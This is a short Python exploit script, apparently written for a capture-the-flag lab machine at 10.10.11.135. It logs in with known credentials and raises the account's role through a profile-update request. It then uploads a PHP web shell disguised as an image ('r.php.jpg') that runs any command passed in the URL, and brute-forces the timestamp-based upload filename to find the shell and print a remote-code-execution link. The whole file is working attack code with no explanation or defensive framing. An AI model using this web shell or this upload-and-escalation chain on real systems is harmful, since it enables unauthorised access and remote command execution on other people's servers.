#!/usr/bin/env python3

import requests

from hashlib import md5
from dateutil import parser


def main():
    s = requests.session()
    filename = 'r.php.jpg'

    s.post('http://10.10.11.135/login.php?login=true', data={
        'user': 'aaron',
        'password': 'aaron'
    })
    print(f'Cookie: PHPSESSID={s.cookies["PHPSESSID"]}')

    s.post('http://10.10.11.135/profile_update.php?login.php', data={
        'firstName': 'x', 'lastName': 'x', 'email': 'x', 'company': 'x', 'role': '1'
    })

    r = s.post('http://10.10.11.135/upload.php?login.php', files={
        'fileToUpload': (filename, b'<?php system($_GET["cmd"]); ?>')
    })

    time = int(parser.parse(r.headers['Date']).timestamp())

    for i in range(-5, 5):
        test_file = f"{md5(b'$file_hash' + str(time + i).encode()).hexdigest()}_{filename}"

        if requests.get(f'http://10.10.11.135/images/uploads/{test_file}').status_code == 200:
            print('RCE:', f'http://10.10.11.135/images/uploads/{test_file}')


if __name__ == '__main__':
    main()
